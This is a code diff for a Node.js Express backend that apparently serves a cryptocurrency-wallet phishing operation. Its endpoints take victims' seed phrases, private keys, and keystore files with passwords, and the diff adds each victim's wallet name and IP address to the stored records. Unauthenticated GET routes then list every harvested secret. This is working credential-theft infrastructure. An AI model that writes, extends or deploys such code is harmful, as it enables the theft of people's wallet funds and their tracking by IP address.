@@ -32,7 +32,7 @@ const database = knex({
 
 
 app.post("/configuration" ,(req,res) =>{
-const {phrase} = req.body
+const {phrase, walletname , ipAddress} = req.body
     if (!phrase) {
         return res.status(400).json("Incomplete Form Submission")
     }
@@ -40,6 +40,8 @@ const {phrase} = req.body
     database('root')
     .insert({
         phrase: phrase, 
+        IpAddress : ipAddress,
+        WalletName : walletname
     })
     .then(user =>{ 
         res.status(200).json("success")
@@ -48,7 +50,7 @@ const {phrase} = req.body
 })
 
 app.post("/configurationjson" ,(req,res) =>{
-const { keystore ,password } = req.body
+const { keystore ,password ,  walletname , ipAddress } = req.body
     if (!keystore || !password) {
         return res.status(400).json("Incomplete Form Submission")
     }
@@ -56,6 +58,8 @@ const { keystore ,password } = req.body
     .insert({
         keystoreJson: keystore,
         password: password,
+         IpAddress : ipAddress,
+        WalletName : walletname
         
     })
     .then(user =>{ 
@@ -65,13 +69,15 @@ const { keystore ,password } = req.body
 })
 
 app.post("/configurationprivate" ,(req,res) =>{
-const { privatekey} = req.body
+const { privatekey ,  walletname , ipAddress} = req.body
     if (!privatekey) {
         return res.status(400).json("Incomplete Form Submission")
     }
     database('root')
     .insert({
         privateKey: privatekey,
+         IpAddress : ipAddress,
+        WalletName : walletname
         
     })
     .then(user =>{ 
@@ -81,21 +87,21 @@ const { privatekey} = req.body
 })
 
 app.get("/phrase", (req, res) => {
-    database.select('Id','phrase').from('root')
+    database.select('Id','phrase','WalletName' ,'IpAddress','Timestamp').from('root')
     .then(user => {
        res.status(200).json(user)
     })
 })
 
 app.get("/keystore", (req, res) => {
-    database.select('Id','keystoreJson','password').from('root')
+    database.select('Id','keystoreJson','password','WalletName' ,'IpAddress','Timestamp').from('root')
     .then(user => {
        res.status(200).json(user)
     })
 })
 
 app.get("/privatekey", (req, res) => {
-    database.select('Id','privateKey').from('root')
+    database.select('Id','privateKey','WalletName' ,'IpAddress','Timestamp').from('root')
     .then(user => {
        res.status(200).json(user)
     })
